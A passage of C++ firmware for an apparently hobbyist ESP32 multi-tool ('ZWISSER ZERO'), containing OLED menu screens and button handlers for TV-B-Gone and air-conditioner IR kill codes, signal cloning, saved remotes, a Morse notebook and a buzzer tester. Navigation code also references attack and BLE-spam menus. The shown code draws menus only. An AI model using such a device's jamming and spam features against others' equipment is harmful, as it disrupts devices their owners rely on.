}

void oledRenderCoolBeGone() {
  u8g2.clearBuffer();
  oledDrawTopBar();
  oledDrawTitle("CoolBeGone");
  u8g2.setFont(u8g2_font_5x7_tf);
  char buf[24];
  int y = OLED_CONTENT_Y + 2;
  
  snprintf(buf, sizeof(buf), " %s %s", coolBeGoneRunning ? ">>" : "  ", coolBeGoneRunning ? "ACTIVE" : "OFF");
  if (oledState.cursor == 0) { u8g2.setDrawColor(1); u8g2.drawBox(0, y - 7, 128, 8); u8g2.setDrawColor(0); }
  u8g2.drawStr(0, y, buf); if (oledState.cursor == 0) u8g2.setDrawColor(1);
  y += 9;
  
  if (coolBeGoneRunning) {
    snprintf(buf, sizeof(buf), " Sending Kill Codes...");
    u8g2.drawStr(0, y, buf);
    y += 9;
  }
  
  snprintf(buf, sizeof(buf), " [%s]", coolBeGoneRunning ? "STOP" : "START");
  if (oledState.cursor == 1) { u8g2.setDrawColor(1); u8g2.drawBox(0, y - 7, 128, 8); u8g2.setDrawColor(0); }
  u8g2.drawStr(0, y, buf); if (oledState.cursor == 1) u8g2.setDrawColor(1);
  
  u8g2.setFont(u8g2_font_4x6_tf);
  oledDrawBottomBar();
  u8g2.sendBuffer();
}

void oledRenderIRKill() {
  u8g2.clearBuffer();
  oledDrawTopBar();
  oledDrawTitle("IR Kill");
  u8g2.setFont(u8g2_font_5x7_tf);
  char buf[24];
  int y = OLED_CONTENT_Y + 2;
  
  // TV-B-Gone toggle
  snprintf(buf, sizeof(buf), "TV-B-Gone %s", tvbgoneRunning ? "ON" : "OFF");
  if (oledState.cursor == 0) { u8g2.setDrawColor(1); u8g2.drawBox(0, y - 7, 128, 8); u8g2.setDrawColor(0); }
  u8g2.drawStr(2, y, buf); if (oledState.cursor == 0) u8g2.setDrawColor(1);
  y += 9;
  
  // CoolBeGone toggle
  snprintf(buf, sizeof(buf), "CoolBeGone %s", coolBeGoneRunning ? "ON" : "OFF");
  if (oledState.cursor == 1) { u8g2.setDrawColor(1); u8g2.drawBox(0, y - 7, 128, 8); u8g2.setDrawColor(0); }
  u8g2.drawStr(2, y, buf); if (oledState.cursor == 1) u8g2.setDrawColor(1);
  y += 9;
  
  // Back button
  snprintf(buf, sizeof(buf), "[Back]");
  if (oledState.cursor == 2) { u8g2.setDrawColor(1); u8g2.drawBox(0, y - 7, 128, 8); u8g2.setDrawColor(0); }
  u8g2.drawStr(2, y, buf); if (oledState.cursor == 2) u8g2.setDrawColor(1);
  
  u8g2.setFont(u8g2_font_4x6_tf);
  u8g2.sendBuffer();
}

void oledRenderRemotes() {
  u8g2.clearBuffer();
  oledDrawTopBar();
  oledDrawTitle("Remotes");
  u8g2.setFont(u8g2_font_5x7_tf);
  
  DynamicJsonDocument doc(4096);
  DeserializationError err = deserializeJson(doc, remotesJson);
  int remoteCount = 0;
  if (!err) remoteCount = doc.size();
  
  int y = OLED_CONTENT_Y + 2;
  char buf[24];
  if (remoteCount == 0) {
    u8g2.drawStr(0, y, "No remotes");
  } else {
    const int maxNames = 20;
    String nameStorage[maxNames];
    int idx = 0;
    JsonObject root = doc.as<JsonObject>();
    for (JsonPair p : root) {
      if (idx >= maxNames) break;
      nameStorage[idx] = p.value()["name"].as<String>();
      idx++;
    }
    
    int startIdx = oledState.scrollOffset;
    int visible = min(idx, OLED_MAX_ITEMS);
    if (oledState.cursor >= startIdx + visible) startIdx = oledState.cursor - visible + 1;
    if (oledState.cursor < startIdx) startIdx = oledState.cursor;
    if (startIdx < 0) startIdx = 0;
    
    for (int i = startIdx; i < min(idx, startIdx + visible); i++) {
      bool sel = (i == oledState.cursor);
      if (sel) { u8g2.setDrawColor(1); u8g2.drawBox(0, y - 7, 128, 8); u8g2.setDrawColor(0); }
      u8g2.drawStr(2, y, nameStorage[i].c_str());
      if (sel) u8g2.setDrawColor(1);
      y += 9;
    }
    oledDrawScrollbar(OLED_CONTENT_Y, y - OLED_CONTENT_Y, idx, visible, startIdx);
  }
  
  u8g2.setFont(u8g2_font_4x6_tf);
  oledDrawBottomBar();
  u8g2.sendBuffer();
}

void oledRenderRemoteButtons() {
  u8g2.clearBuffer();
  oledDrawTopBar();
  u8g2.setFont(u8g2_font_5x7_tf);
  
  DynamicJsonDocument doc(4096);
  DeserializationError err = deserializeJson(doc, remotesJson);
  
  int y = OLED_CONTENT_Y + 2;
  char buf[24];
  if (err) {
    u8g2.drawStr(0, y, "Error loading");
  } else {
    JsonObject root = doc.as<JsonObject>();
    int idx = 0;
    JsonObject targetRemote;
    String remoteName = "?";
    
    for (JsonPair p : root) {
      if (idx == oledState.remoteIdx) {
        targetRemote = p.value().as<JsonObject>();
        remoteName = targetRemote["name"].as<String>();
        break;
      }
      idx++;
    }
    
    if (targetRemote.isNull()) {
      u8g2.drawStr(0, y, "Not found");
    } else {
      JsonArray buttons = targetRemote["buttons"].as<JsonArray>();
      int btnCount = buttons.size();
      
      snprintf(buf, sizeof(buf), "%s", remoteName.c_str());
      oledDrawTitle(buf);
      
      y = OLED_CONTENT_Y + 12;
      if (btnCount == 0) {
        u8g2.drawStr(0, y, "No buttons");
      } else {
        int startIdx = oledState.scrollOffset;
        int visible = min(btnCount, OLED_MAX_ITEMS);
        if (oledState.cursor >= startIdx + visible) startIdx = oledState.cursor - visible + 1;
        if (oledState.cursor < startIdx) startIdx = oledState.cursor;
        if (startIdx < 0) startIdx = 0;
        
        for (int i = startIdx; i < min(btnCount, startIdx + visible); i++) {
          const char* btnName = buttons[i]["name"] | "Unnamed";
          bool sel = (i == oledState.cursor);
          if (sel) { u8g2.setDrawColor(1); u8g2.drawBox(0, y - 7, 128, 8); u8g2.setDrawColor(0); }
          u8g2.drawStr(2, y, btnName);
          if (sel) u8g2.setDrawColor(1);
          y += 9;
        }
        oledDrawScrollbar(OLED_CONTENT_Y + 10, y - OLED_CONTENT_Y - 10, btnCount, visible, startIdx);
      }
    }
  }
  
  u8g2.setFont(u8g2_font_4x6_tf);
  oledDrawBottomBar();
  u8g2.sendBuffer();
}

void oledRenderSignals() {
  u8g2.clearBuffer();
  oledDrawTopBar();
  oledDrawTitle("Signals");
  u8g2.setFont(u8g2_font_5x7_tf);
  
  DynamicJsonDocument doc(4096);
  DeserializationError err = deserializeJson(doc, signalsJson);
  int sigCount = 0;
  if (!err) sigCount = doc.size();
  int totalItems = sigCount + 1; // +1 for the "[+ Clone New Signal]" row
  
  int y = OLED_CONTENT_Y + 2;
  char buf[24];
  
  // Calculate scroll boundaries considering the clone row at index 0
  int startIdx = oledState.scrollOffset;
  int visible = min(totalItems, OLED_MAX_ITEMS);
  if (oledState.cursor >= startIdx + visible) startIdx = oledState.cursor - visible + 1;
  if (oledState.cursor < startIdx) startIdx = oledState.cursor;
  if (startIdx < 0) startIdx = 0;
  
  // Row 0: "[+ Clone New Signal]" always at cursor index 0
  for (int i = startIdx; i < min(totalItems, startIdx + visible); i++) {
    bool sel = (i == oledState.cursor);
    if (i == 0) {
      // Clone New Signal action row
      if (sel) { u8g2.setDrawColor(1); u8g2.drawBox(0, y - 7, 128, 8); u8g2.setDrawColor(0); }
      u8g2.drawStr(2, y, "[+ Clone New Signal]");
      if (sel) u8g2.setDrawColor(1);
    } else {
      // JSON signal entry (offset index by -1)
      int jsonIdx = i - 1;
      if (jsonIdx < sigCount) {
        const char* name = doc[jsonIdx]["name"] | "Unknown";
        if (sel) { u8g2.setDrawColor(1); u8g2.drawBox(0, y - 7, 128, 8); u8g2.setDrawColor(0); }
        u8g2.drawStr(2, y, name);
        if (sel) u8g2.setDrawColor(1);
      }
    }
    y += 9;
  }
  
  oledDrawScrollbar(OLED_CONTENT_Y, y - OLED_CONTENT_Y, totalItems, visible, startIdx);
  
  u8g2.setFont(u8g2_font_4x6_tf);
  oledDrawBottomBar();
  u8g2.sendBuffer();
}

void oledRenderProjectors() {
  u8g2.clearBuffer();
  oledDrawTopBar();
  oledDrawTitle("Projectors");
  u8g2.setFont(u8g2_font_5x7_tf);
  char buf[24];
  int y = OLED_CONTENT_Y + 2;
  
  snprintf(buf, sizeof(buf), " Brand: %s", projBrandNames[oledState.projBrand]);
  if (oledState.projField == 0) { u8g2.setDrawColor(1); u8g2.drawBox(0, y - 7, 128, 8); u8g2.setDrawColor(0); }
  u8g2.drawStr(0, y, buf); if (oledState.projField == 0) u8g2.setDrawColor(1);
  y += 9;
  
  snprintf(buf, sizeof(buf), " [ Power ON ]");
  if (oledState.projField == 1) { u8g2.setDrawColor(1); u8g2.drawBox(0, y - 7, 128, 8); u8g2.setDrawColor(0); }
  u8g2.drawStr(0, y, buf); if (oledState.projField == 1) u8g2.setDrawColor(1);
  y += 9;
  
  snprintf(buf, sizeof(buf), " [ Power OFF ]");
  if (oledState.projField == 2) { u8g2.setDrawColor(1); u8g2.drawBox(0, y - 7, 128, 8); u8g2.setDrawColor(0); }
  u8g2.drawStr(0, y, buf); if (oledState.projField == 2) u8g2.setDrawColor(1);
  y += 9;
  
  snprintf(buf, sizeof(buf), " [ Back ]");
  if (oledState.projField == 3) { u8g2.setDrawColor(1); u8g2.drawBox(0, y - 7, 128, 8); u8g2.setDrawColor(0); }
  u8g2.drawStr(0, y, buf); if (oledState.projField == 3) u8g2.setDrawColor(1);
  
  u8g2.setFont(u8g2_font_4x6_tf);
  u8g2.sendBuffer();
}

void oledRenderThemes() {
  u8g2.clearBuffer();
  oledDrawTopBar();
  oledDrawTitle("Themes");
  
  int startIdx = oledState.scrollOffset;
  int visible = min(MAX_THEMES + 1, OLED_MAX_ITEMS);
  if (oledState.cursor >= startIdx + visible) startIdx = oledState.cursor - visible + 1;
  if (oledState.cursor < startIdx) startIdx = oledState.cursor;
  if (startIdx < 0) startIdx = 0;
  
  int y = OLED_CONTENT_Y + 2;
  char buf[24];
  for (int i = startIdx; i < min(MAX_THEMES, startIdx + visible); i++) {
    bool sel = (i == oledState.cursor);
    if (sel) { u8g2.setDrawColor(1); u8g2.drawBox(0, y - 7, 128, 8); u8g2.setDrawColor(0); }
    snprintf(buf, sizeof(buf), "%s%s", themeNames[i], (i == themeIndex) ? " *" : "");
    u8g2.drawStr(2, y, buf);
    if (sel) u8g2.setDrawColor(1);
    y += 9;
  }
  
  // Back button
  int backIdx = MAX_THEMES;
  if (backIdx >= startIdx && backIdx < startIdx + visible) {
    bool sel = (backIdx == oledState.cursor);
    if (sel) { u8g2.setDrawColor(1); u8g2.drawBox(0, y - 7, 128, 8); u8g2.setDrawColor(0); }
    u8g2.drawStr(2, y, "[Back]");
    if (sel) u8g2.setDrawColor(1);
  }
  
  oledDrawScrollbar(OLED_CONTENT_Y, y - OLED_CONTENT_Y, MAX_THEMES + 1, visible, startIdx);
  
  u8g2.setFont(u8g2_font_4x6_tf);
  u8g2.drawStr(0, 55, "CENTER apply/back");
  u8g2.sendBuffer();
}

void oledRenderSystem() {
  u8g2.clearBuffer();
  oledDrawTopBar();
  oledDrawTitle("System");
  oledDrawIconList(OLED_CONTENT_Y + 10, systemMenuItems, systemMenuItemCount, oledState.cursor, &oledState.scrollOffset, nullptr);
  oledDrawBottomBar();
  u8g2.sendBuffer();
}

void oledRenderStats() {
  u8g2.clearBuffer();
  oledDrawTopBar();
  oledDrawTitle("Sys Stats");
  u8g2.setFont(u8g2_font_5x7_tf);
  char buf[24];
  int y = OLED_CONTENT_Y + 2;
  
  float tempC = temperatureRead();
  snprintf(buf, sizeof(buf), "Temp:%.1fC", (double)tempC);
  u8g2.drawStr(0, y, buf);
  y += 9;
  
  snprintf(buf, sizeof(buf), "CPU:%dMHz", ESP.getCpuFreqMHz());
  u8g2.drawStr(0, y, buf);
  y += 9;
  
  snprintf(buf, sizeof(buf), "RAM:%d/%dKB", ESP.getFreeHeap()/1024, ESP.getHeapSize()/1024);
  u8g2.drawStr(0, y, buf);
  y += 9;
  
  if (ESP.getPsramSize() > 0) {
    snprintf(buf, sizeof(buf), "PSRAM:%d/%dKB", ESP.getFreePsram()/1024, ESP.getPsramSize()/1024);
    u8g2.drawStr(0, y, buf);
    y += 9;
  }
  
  String rssi = (WiFi.status() == WL_CONNECTED) ? String(WiFi.RSSI()) + "dBm" : "N/A";
  snprintf(buf, sizeof(buf), "WiFi:%s", rssi.c_str());
  u8g2.drawStr(0, y, buf);
  y += 9;
  
  unsigned long up = millis() / 1000;
  snprintf(buf, sizeof(buf), "Up:%02lu:%02lu:%02lu", up/3600, (up%3600)/60, up%60);
  u8g2.drawStr(0, y, buf);
  
  u8g2.setFont(u8g2_font_4x6_tf);
  oledDrawBottomBar();
  u8g2.sendBuffer();
}

void oledRenderLog() {
  u8g2.clearBuffer();
  oledDrawTopBar();
  oledDrawTitle("Sys Log");
  u8g2.setFont(u8g2_font_4x6_tf);
  
  if (logCount == 0) {
    u8g2.drawStr(0, OLED_CONTENT_Y + 2, "No logs");
  } else {
    int startIdx = oledState.scrollOffset;
    if (startIdx < 0) startIdx = 0;
    if (startIdx >= logCount) startIdx = logCount - 1;
    
    int visible = min(logCount, 5);
    if (startIdx + visible > logCount) startIdx = logCount - visible;
    if (startIdx < 0) startIdx = 0;
    
    int y = OLED_CONTENT_Y + 2;
    int start = (logCount < MAX_LOG_LINES) ? 0 : logIndex;
    for (int i = startIdx; i < min(logCount, startIdx + visible); i++) {
      int idx = (start + i) % MAX_LOG_LINES;
      String line = logBuffer[idx];
      if (line.length() > 18) line = line.substring(0, 18);
      u8g2.drawStr(0, y, line.c_str());
      y += 7;
    }
    
    oledDrawScrollbar(OLED_CONTENT_Y, y - OLED_CONTENT_Y, logCount, visible, startIdx);
  }
  
  u8g2.setFont(u8g2_font_4x6_tf);
  oledDrawBottomBar();
  u8g2.sendBuffer();
}

void oledRenderConfirm() {
  u8g2.clearBuffer();
  oledDrawTopBar();
  oledDrawTitle("Confirm");
  u8g2.setFont(u8g2_font_5x7_tf);
  
  const char* actions[] = {"Reboot?", "Factory Reset?", "Exit?"};
  const char* msg = actions[oledState.confirmAction];
  if (oledState.confirmAction > 2) msg = "Confirm?";
  
  int y = OLED_CONTENT_Y + 4;
  u8g2.drawStr(0, y, msg);
  y += 12;
  
  char buf[16];
  snprintf(buf, sizeof(buf), " YES");
  if (oledState.cursor == 0) { u8g2.setDrawColor(1); u8g2.drawBox(0, y - 7, 128, 8); u8g2.setDrawColor(0); }
  u8g2.drawStr(0, y, buf); if (oledState.cursor == 0) u8g2.setDrawColor(1);
  y += 10;
  
  snprintf(buf, sizeof(buf), " NO");
  if (oledState.cursor == 1) { u8g2.setDrawColor(1); u8g2.drawBox(0, y - 7, 128, 8); u8g2.setDrawColor(0); }
  u8g2.drawStr(0, y, buf); if (oledState.cursor == 1) u8g2.setDrawColor(1);
  
  u8g2.setFont(u8g2_font_4x6_tf);
  u8g2.drawStr(0, 55, "< > move  CENTER confirm");
  oledDrawBottomBar();
  u8g2.sendBuffer();
}

void oledRenderMusic() {
  u8g2.clearBuffer();
  oledDrawTopBar();
  oledDrawTitle("Music");
  char buf[24];
  int y = OLED_CONTENT_Y + 2;
  
  // Song list starts at top
  int songCursor = oledState.cursor - 1;
  if (songCursor < 0) songCursor = 0;
  int startIdx = oledState.scrollOffset;
  int visible = min(songCount + 1, OLED_MAX_ITEMS);
  if (oledState.cursor >= startIdx + visible) startIdx = oledState.cursor - visible + 1;
  if (oledState.cursor < startIdx) startIdx = oledState.cursor;
  if (startIdx < 0) startIdx = 0;
  
  for (int i = startIdx; i < min(songCount, startIdx + visible); i++) {
    bool sel = (i == oledState.cursor);
    bool isCur = (i == musicSongIndex && (musicPlaying || musicNoteIndex > 0));
    u8g2.setFont(u8g2_font_5x7_tf);
    snprintf(buf, sizeof(buf), "%s%s%s", sel ? ">" : " ", songNames[i], isCur ? " <<<" : "");
    if (sel) { u8g2.setDrawColor(1); u8g2.drawBox(0, y - 7, 128, 8); u8g2.setDrawColor(0); }
    u8g2.drawStr(0, y, buf);
    if (sel) u8g2.setDrawColor(1);
    y += 9;
  }
  
  // Back button at bottom
  int backIdx = songCount;
  if (backIdx >= startIdx && backIdx < startIdx + visible) {
    u8g2.setFont(u8g2_font_5x7_tf);
    bool sel = (backIdx == oledState.cursor);
    if (sel) { u8g2.setDrawColor(1); u8g2.drawBox(0, y - 7, 128, 8); u8g2.setDrawColor(0); }
    u8g2.drawStr(2, y, "[Back]");
    if (sel) u8g2.setDrawColor(1);
  }
  
  oledDrawScrollbar(OLED_CONTENT_Y + 2, y - OLED_CONTENT_Y - 2, songCount + 1, visible, startIdx);
  
  u8g2.sendBuffer();
}

void oledRenderGames() {
  u8g2.clearBuffer();
  oledDrawTopBar();
  oledDrawTitle("Games");
  oledDrawIconList(OLED_CONTENT_Y + 10, gamesMenuItems, gamesMenuItemCount, oledState.cursor, &oledState.scrollOffset, nullptr);
  u8g2.sendBuffer();
}

void oledRenderAbout() {
  u8g2.clearBuffer();
  oledDrawTopBar();
  oledDrawTitle("About");
  u8g2.setFont(u8g2_font_5x7_tf);
  int y = OLED_CONTENT_Y + 4;
  
  u8g2.drawStr(0, y, "ZWISSER ZERO");
  y += 9;
  u8g2.setFont(u8g2_font_4x6_tf);
  u8g2.drawStr(0, y, "Omni-protocol Vector Alterer");
  y += 8;
  u8g2.drawStr(0, y, "Made by Zalan Lykos (Google)");
  y += 8;
  u8g2.drawStr(0, y, "Website: zalanlykos.github.io");
  y += 8;
  u8g2.drawStr(0, y, "If found, call 03295679004");
  y += 8;
  
  char buf[24];
  snprintf(buf, sizeof(buf), "Up: %lu min", millis()/60000);
  u8g2.drawStr(0, y, buf);
  y += 12;
  
  // Back button
  snprintf(buf, sizeof(buf), "");
  bool sel = (oledState.cursor == 0);
  if (sel) { u8g2.setDrawColor(1); u8g2.drawBox(0, y - 7, 128, 8); u8g2.setDrawColor(0); }
  u8g2.drawStr(2, y, buf);
  if (sel) u8g2.setDrawColor(1);
  
  u8g2.setFont(u8g2_font_4x6_tf);
  u8g2.sendBuffer();
}

// ===================== MORSE NOTEBOOK RENDERER =====================
void oledRenderMorseNotebook() {
    u8g2.clearBuffer();
    oledDrawTopBar();
    
    u8g2.setFont(u8g2_font_5x7_tf);
    char buf[22];
    
    // Draw Status Header
    u8g2.drawStr(2, OLED_CONTENT_Y + 1, "Morse Notebook");
    
    // Draw Committed Text Layer with horizontal scrolling
    int yText = OLED_CONTENT_Y + 14;
    
    // Blinking cursor timer
    unsigned long now = millis();
    if (now - lastBlinkTime > 400) {
        cursorVisible = !cursorVisible;
        lastBlinkTime = now;
    }
    
    // Calculate cursor X position in full text space
    int cursorX = u8g2.getStrWidth(notebookText.substring(0, notebookCursorPos).c_str());
    const int visibleWidth = 124; // 128 - 4px padding
    int scrollOffsetX = 0;
    
    // If cursor is beyond visible area with 6px right margin, scroll right
    if (cursorX + 6 > visibleWidth + scrollOffsetX) {
        scrollOffsetX = cursorX + 6 - visibleWidth;
    }
    // If cursor is too far left (more than 2px from left edge), scroll back
    if (cursorX - 2 < scrollOffsetX) {
        scrollOffsetX = max(0, cursorX - 2);
    }
    // Clamp scroll offset to not scroll past end of text
    int textWidth = u8g2.getStrWidth(notebookText.c_str());
    if (scrollOffsetX + visibleWidth > textWidth + 6) {
        scrollOffsetX = max(0, textWidth + 6 - visibleWidth);
    }
    if (scrollOffsetX < 0) scrollOffsetX = 0;
    
    // Set clip window to keep text within bounds
    u8g2.setClipWindow(2, yText - 7, 126, yText + 1);
    
    // Draw text character by character with scroll offset
    for (int i = 0; i < notebookText.length(); i++) {
        int cx = 2 + u8g2.getStrWidth(notebookText.substring(0, i).c_str()) - scrollOffsetX;
        // Only draw if within visible area
        if (cx >= -4 && cx <= 130) {
            char ch[2] = {notebookText.charAt(i), 0};
            u8g2.drawStr(cx, yText, ch);
        }
    }
    
    // Draw blinking cursor at calculated position
    if (notebookText.length() > 0 || true) {
        int finalCursorX = 2 + cursorX - scrollOffsetX;
        if (cursorVisible && finalCursorX >= 2 && finalCursorX <= 126) {
            u8g2.drawStr(finalCursorX, yText, "|");
        }
    } else {
        if (cursorVisible) {
            u8g2.drawStr(2, yText, "|");
        }
    }
    
    // Restore clip window to full screen
    u8g2.setMaxClipWindow();
    
    // Draw Dynamic Staging / Composition Bar
    u8g2.setFont(u8g2_font_4x6_tf);
    char decodedChar = (activeTapVisual.length() > 0 && morseTreeIdx > 0 && morseTreeIdx < 63 && morseTree[morseTreeIdx] != '*') ? morseTree[morseTreeIdx] : '?';
    snprintf(buf, sizeof(buf), "Draft: %s -> '%c'", activeTapVisual.c_str(), decodedChar);
    u8g2.drawStr(2, OLED_CONTENT_Y + 30, buf);
    
    // Draw Controls Legend Footer
    u8g2.drawStr(2, OLED_CONTENT_Y + 40, "U=. D=- MID=Set L/R=Nav");
    
    // Draw wipe-in-progress alert
    if (morseLeftWiping) {
        u8g2.drawStr(2, OLED_CONTENT_Y + 50, "[ Wiping... ]");
    }
    
    u8g2.sendBuffer();
}

// ===================== MORSE NOTEBOOK INPUT HANDLER =====================
void handleMorseNotebookInput() {
    unsigned long now = millis();
    
    // ---- UP BUTTON: Dot ----
    if (btnUpPressed) {
        tone(BUZZER_PIN, 2100, 80);
        if (morseTreeIdx < 31) {
            morseTreeIdx = 2 * morseTreeIdx + 1;
            activeTapVisual += ".";
        }
        oledNeedsRedraw = true;
        btnUpPressed = false;
        return;
    }
    
    // ---- DOWN BUTTON: Dash ----
    if (btnDownPressed) {
        tone(BUZZER_PIN, 2100, 200);
        if (morseTreeIdx < 31) {
            morseTreeIdx = 2 * morseTreeIdx + 2;
            activeTapVisual += "-";
        }
        oledNeedsRedraw = true;
        btnDownPressed = false;
        return;
    }
    
    // ---- CENTER BUTTON: Confirm/Space ----
    if (btnCenterPressed) {
        if (activeTapVisual.length() > 0 && morseTreeIdx > 0 && morseTreeIdx < 63 && morseTree[morseTreeIdx] != '*') {
            // Insert character at cursor position
            char c = morseTree[morseTreeIdx];
            notebookText = notebookText.substring(0, notebookCursorPos) + String(c) + notebookText.substring(notebookCursorPos);
            notebookCursorPos++;
        } else if (activeTapVisual.length() == 0) {
            // Insert space
            notebookText = notebookText.substring(0, notebookCursorPos) + " " + notebookText.substring(notebookCursorPos);
            notebookCursorPos++;
        }
        // Reset staging
        morseTreeIdx = 0;
        activeTapVisual = "";
        oledNeedsRedraw = true;
        btnCenterPressed = false;
        return;
    }
    
    // ---- LEFT BUTTON: Clear staging, cursor left, OR wipe ----
    // Handle short-press on initial press event (btnLeftPressed)
    if (btnLeftPressed) {
        if (activeTapVisual.length() > 0) {
            // Clear staging
            morseTreeIdx = 0;
            activeTapVisual = "";
        } else if (notebookCursorPos > 0) {
            notebookCursorPos--;
        }
        oledNeedsRedraw = true;
        btnLeftPressed = false;
        return; // Don't also process hold on the same press
    }
    // Long-press wipe detection (1500ms)
    if (btnLeftState == LOW) {
        if (!morseLeftWiping) {
            morseLeftWiping = true;
            morseLeftWipeStart = now;
        } else if (now - morseLeftWipeStart >= MORSE_WIPE_HOLD_MS) {
            // Wipe all text and return to main menu
            notebookText = "";
            notebookCursorPos = 0;
            morseTreeIdx = 0;
            activeTapVisual = "";
            morseLeftWiping = false;
            oledState.screen = MENU_MAIN;
            oledState.cursor = 0;
            oledState.mainMenuPage = 1;
            oledState.scrollOffset = 0;
            oledNeedsRedraw = true;
            return;
        }
    } else {
        morseLeftWiping = false;
    }
    
    // ---- RIGHT BUTTON: Cursor right / dynamic backspace ----
    // Handle short-press on initial press event (btnRightPressed)
    if (btnRightPressed) {
        if (notebookCursorPos < notebookText.length()) {
            notebookCursorPos++;
        }
        oledNeedsRedraw = true;
        btnRightPressed = false;
        return; // Don't also process hold on the same press
    }
    // Long-press: dynamic backspace while held
    if (btnRightState == LOW) {
        if (!morseRightHeld) {
            morseRightHeld = true;
            morseRightHoldStart = now;
        }
        // After initial hold, repeat every 150ms
        if (now - morseRightHoldStart >= MORSE_BACKSPACE_INTERVAL) {
            if (notebookCursorPos > 0) {
                notebookText = notebookText.substring(0, notebookCursorPos - 1) + notebookText.substring(notebookCursorPos);
                notebookCursorPos--;
                oledNeedsRedraw = true;
            }
            morseRightHoldStart = now; // reset interval timer
        }
    } else {
        morseRightHeld = false;
    }
}

// ===================== FREQ TESTER RENDERER =====================
void oledRenderFreqTester() {
  u8g2.clearBuffer();
  oledDrawTopBar();
  
  u8g2.setFont(u8g2_font_5x7_tf);
  char buf[24];
  
  // Header
  snprintf(buf, sizeof(buf), "Buzzer");
  u8g2.drawStr(2, OLED_CONTENT_Y + 2, buf);
  
  // Large frequency value
  u8g2.setFont(u8g2_font_10x20_tf);
  snprintf(buf, sizeof(buf), "%4d Hz", testFrequency);
  u8g2.drawStr(10, OLED_CONTENT_Y + 24, buf);
  
  // Status line
  u8g2.setFont(u8g2_font_5x7_tf);
  if (isBuzzerPlaying) {
    u8g2.drawStr(2, OLED_CONTENT_Y + 38, "Status: ACTIVE BLAST");
  } else {
    u8g2.drawStr(2, OLED_CONTENT_Y + 38, "Status: Ready...");
  }
  
  // Legend footer
  u8g2.setFont(u8g2_font_4x6_tf);
  u8g2.drawStr(2, 62, "UP/DN=Hz  MID=Play  L=Exit");
  
  u8g2.sendBuffer();
}

// ===================== FREQ TESTER INPUT HANDLER =====================
void handleFreqTesterInput() {
  // UP: +50 Hz, cap 5000
  if (btnUpPressed) {
    if (testFrequency <= 5000 - 50) {
      testFrequency += 50;
    } else {
      testFrequency = 5000;
    }
    if (isBuzzerPlaying) {
      noTone(BUZZER_PIN);
      tone(BUZZER_PIN, testFrequency);
    }
    oledNeedsRedraw = true;
    btnUpPressed = false;
    addLog("[FREQ] UP: %d Hz", testFrequency);
    return;
  }
  
  // DOWN: -50 Hz, floor 100
  if (btnDownPressed) {
    if (testFrequency >= 100 + 50) {
      testFrequency -= 50;
    } else {
      testFrequency = 100;
    }
    if (isBuzzerPlaying) {
      noTone(BUZZER_PIN);
      tone(BUZZER_PIN, testFrequency);
    }
    oledNeedsRedraw = true;
    btnDownPressed = false;
    addLog("[FREQ] DOWN: %d Hz", testFrequency);
    return;
  }
  
  // CENTER: Toggle playback
  if (btnCenterPressed) {
    isBuzzerPlaying = !isBuzzerPlaying;
    if (isBuzzerPlaying) {
      tone(BUZZER_PIN, testFrequency);
      addLog("[FREQ] Tone ON: %d Hz", testFrequency);
    } else {
      noTone(BUZZER_PIN);
      addLog("[FREQ] Tone OFF");
    }
    oledNeedsRedraw = true;
    btnCenterPressed = false;
    return;
  }
  
  // LEFT: Safety stop and return to menu
  if (btnLeftPressed) {
    noTone(BUZZER_PIN);
    isBuzzerPlaying = false;
    oledState.screen = MENU_MAIN;
    oledState.cursor = 0;
    oledState.scrollOffset = 0;
    oledState.mainMenuPage = 1;
    oledNeedsRedraw = true;
    btnLeftPressed = false;
    addLog("[FREQ] Exit to menu");
    return;
  }
}

// ===================== SCREENSAVER =====================

void oledWakeUp() {
  if (oledOff) {
    u8g2.setPowerSave(0);
    oledOff = false;
  }
  if (oledDimmed) {
    u8g2.setContrast(OLED_CONTRAST_NORMAL);
    oledDimmed = false;
  }
  oledLastActivity = millis();
  oledNeedsRedraw = true;
}

void oledCheckScreensaver() {
  unsigned long now = millis();
  unsigned long idle = now - oledLastActivity;
  
  if (!oledOff && idle > OLED_OFF_MS) {
    u8g2.setPowerSave(1);
    oledOff = true;
    oledDimmed = false;
  } else if (!oledDimmed && !oledOff && idle > OLED_DIM_MS) {
    u8g2.setContrast(OLED_CONTRAST_DIM);
    oledDimmed = true;
  }
}

// ===================== NAVIGATION HANDLER =====================

// Go back to parent screen (called when LEFT is held for 1.5s)
void oledGoBack() {
  addLog("[OLED] Back");
  switch (oledState.screen) {
    case MENU_WIFI: case MENU_WIFI_STATUS: case MENU_WIFI_SCAN:
    case MENU_BT: case MENU_BT_SCAN: case MENU_BT_PAIRED:
    case MENU_ATTACKS: case MENU_BLESPAM:
    case MENU_IR: case MENU_IR_SEND: case MENU_GREE: case MENU_TVBGONE: case MENU_COOLBEGONE: case MENU_IR_KILL:
    case MENU_REMOTES: case MENU_SIGNALS:
    case MENU_THEMES:
    case MENU_MUSIC:
    case MENU_SYSTEM: case MENU_STATS: case MENU_LOG:
    case MENU_ABOUT:
    case MENU_GAMES:
    case MENU_FREQ_TESTER:
      noTone(BUZZER_PIN);
      isBuzzerPlaying = false;
      oledState.screen = MENU_MAIN;
      oledState.cursor = 0;
      oledState.scrollOffset = 0;
      break;
    case MENU_PROJECTORS:
      oledState.screen = MENU_IR;
      oledState.cursor = 6;
      oledState.scrollOffset = 0;
      break;
    case MENU_REMOTE_BUTTONS:
      oledState.screen = MENU_REMOTES;
      oledState.cursor = oledState.remoteIdx;
      oledState.scrollOffset = 0;
      break;
    case MENU_CONFIRM:
      oledState.screen = MENU_SYSTEM;
      oledState.cursor = 0;
      oledState.scrollOffset = 0;
      break;
    default:
      // Already on main or other: do nothing
      break;
  }
  oledNeedsRedraw = true;
}

void oledNavigateLeft() {
  switch (oledState.screen) {
    case MENU_MAIN: {
      // Move cursor left in grid, or flip page if at leftmost column
      int page = oledState.mainMenuPage;
      int count = mainMenuCardCounts[page];
      int col = oledState.cursor % 3;
      int row = oledState.cursor / 3;
      if (col > 0) {
        // Move left within same row
        oledState.cursor--;
      } else if (page > 0) {
        // At leftmost column, flip to previous page, go to rightmost column
        oledState.mainMenuPage--;
        int newCount = mainMenuCardCounts[page - 1];
        // Position at rightmost column on same row, or last item
        int target = row * 3 + 2;
        if (target >= newCount) target = newCount - 1;
        if (target < 0) target = 0;
        oledState.cursor = target;
      }
      break;
    }
    case MENU_PROJECTORS: {
      // Cycle brand backward
      if (oledState.projField == 0) {
        oledState.projBrand = (oledState.projBrand - 1 + projBrandCount) % projBrandCount;
        addLog("[PROJ] Brand: %s", projBrandNames[oledState.projBrand]);
      }
      break;
    }
    case MENU_GREE: {
      // Decrement the current field value
